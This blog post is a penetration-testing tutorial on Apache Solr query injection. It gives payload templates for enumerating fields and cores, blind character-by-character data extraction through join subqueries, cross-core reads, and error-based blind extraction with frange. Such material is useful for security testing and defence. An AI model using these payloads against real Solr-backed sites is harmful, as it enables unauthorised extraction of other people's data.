---
layout: post
title: Solr Query Injection
categories: security
---

[Apache Solr](https://solr.apache.org/) is a NoSQL datastore that is typically used as an enterprise search platform.

Most resources on Solr injection seem to be about CVEs or [injecting additional parameters](https://github.com/veracode-research/solr-injection) into calls to the Solr REST API. This post covers some techniques you can use when you only have control over the q parameter and are interested in extracting data from the index itself.

The techniques may not be applicable in newer versions of Solr as the [default settings were changed](https://lucene.apache.org/solr/guide/8_6/major-changes-in-solr-8.html#solr-7-2) in Solr 7.2 to limit when switching query parsers is allowed. These techniques may still work if the target has `luceneMatchVersion` set to 7.1.0 or lower in their solrconfig.xml file.

For the purposes of this post we'll assume the query you're injecting into looks like this:

```
somefield:INJECTIONPOINT
```

## Basics

Solr supports running multiple indexes, called cores, with separate configurations on the same server. This section covers techniques where the information you want is in the same core as the query injection location.

### Enumerate available fields in the current core

This is a brute force guessing game.

```
* AND FIELDNAMEGUESS:*
```

If you still get results, the field exists. If you get an error or no results, the field doesn't exist.

### Extract query parameters

Determining the value of the [common query parameters](https://lucene.apache.org/solr/guide/8_6/common-query-parameters.html) will help you understand the context your query is in.

```
* AND {!switch case='notarealfieldthiswillerrorout:5' case.1='*:*' v=$rows}
```

if `$rows` exists and equals 1, this will work, otherwise you will get an error.

### Field values extraction

Solr supports [limited join functionality](https://solr.apache.org/guide/8_11/other-parsers.html#join-query-parser) that is similar to an SQL inner-query.

The following query
```
* AND {!join from=knownfield to:knownfield v='other_condition'}
```

is [roughly equivalent to this SQL](https://lucene.apache.org/solr/guide/8_6/other-parsers.html#join-query-parser)

```sql
SELECT *
FROM current_core
WHERE knownfield IN (SELECT knownfield
                     FROM current_core
                     WHERE other_condition)
```

If your query returns any results you know that there was a row in the table where `other_condition` was true.

Similar to blind SQL injection, you can use this by making other_condition increasily specific until it matches only one record and then brute force values of additional fields on the record using wildcards.

```
* AND {!join from=knownfield to:knownfield v='id:1234 AND field_of_interest:*'}
* AND {!join from=knownfield to:knownfield v='id:1234 AND field_of_interest:m*'}
* AND {!join from=knownfield to:knownfield v='id:1234 AND field_of_interest:ma*'}
* AND {!join from=knownfield to:knownfield v='id:1234 AND field_of_interest:mag*'}
* AND {!join from=knownfield to:knownfield v='id:1234 AND field_of_interest:magi*'}
* AND {!join from=knownfield to:knownfield v='id:1234 AND field_of_interest:magic'}
```

### Unencumbered subquery

The following query

```
condition AND {!join from=field_on_current_core to=field v="{!join from=any_field_on_current_core to=any_field_on_current_core v='other_condition'}"}
```

is roughly equivalent to

```sql
SELECT *
FROM current_core
WHERE condition AND
      field IN (SELECT field_on_current_core
                FROM current_core
                WHERE any_field_on_current_core IN (SELECT any_field_on_current_core
                                                  FROM current_core
                                                  WHERE other_condition))
```

With appropriate choice of fields, the query comes down to whether there is any row in `current_core` where `other_condition` is true.

## Working across cores

Solr joins can be used to extract data from cores other than one currently being queried.

### Enumerate other cores in the index

This is a brute force guessing game. You have to guess both the name of the other core and the name of a field in it in one go.

If you found any generic-sounding field names in the previous section like `id`, I recommend you assume other cores have that field and just guess core names.

```
* AND {!join from=KNOWNFIELD fromIndex=CORENAMEGUESS to:KNOWNFIELD v='*:*'}
```

### Cross-core field value extraction

After enumerating some other cores and fields, you can modify the join to extract values from joined documents.

The following query:

```
* AND {!join from=field_on_other_core fromIndex=other_core to:KNOWNFIELD v='other_condition'}
```

is roughly equivalent to

```sql
SELECT * FROM current_core
WHERE KNOWNFIELD IN (SELECT field_on_other_core
                     FROM other_core
                     WHERE other_condition)
```

### Unencumbered subquery

The following query

```
condition AND {!join from=field_on_other_core fromIndex=other_core to=field v="{!join from=any_field_on_other_core fromIndex=other_core to=any_field_on_other_core v='other_condition'}"}
```

is roughly equivalent to

```sql
SELECT *
FROM current_core
WHERE condition AND
      field IN (SELECT field_on_other_core
                FROM other_core
                WHERE any_field_on_other_core IN (SELECT any_field_on_other_core
                                                  FROM other_core
                                                  WHERE other_condition))
```

With appropriate choice of fields, the query comes down to whether there is a row in `other_core` where `other_condition` is true.

## Fully blind injection

Sometimes a site is querying Solr behind the scenes with user input but the results are never shown to the user. If you find an injection point in such a query, it may still be possible to extract information by triggering an Internal Sever Error if the query result set is empty.

```
* AND {!frange l=1 v='def(query({!edismax v="SOMECONDITION*"}),"a")'}
```

The [frange](https://solr.apache.org/guide/8_11/other-parsers.html#function-range-query-parser) query parser expects a number as input. With this query, if `SOMECONDITION` matches something, [def](https://solr.apache.org/guide/8_11/function-queries.html#def-function) passes the document score to frange, otherwise it passes the string "a" which causes an error.